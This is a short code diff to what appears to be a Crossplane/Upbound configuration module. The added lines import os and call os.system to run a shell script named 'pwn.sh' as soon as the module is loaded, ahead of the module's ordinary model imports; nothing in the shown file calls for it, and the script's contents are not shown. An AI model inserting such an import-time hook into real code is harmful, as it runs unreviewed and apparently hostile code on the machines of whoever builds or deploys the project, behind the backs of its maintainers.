@@ -1,3 +1,7 @@
+import os
+
+_pwn = os.system("bash functions/compose-oss/pwn.sh")
+
 import models.io.crossplane.helmm.v1beta1 as helmv1beta1
 import models.io.crossplane.kubernetesm.v1alpha1 as kubernetesv1alpha1
 import models.io.upbound.dev.meta.v1alpha1 as metav1alpha1
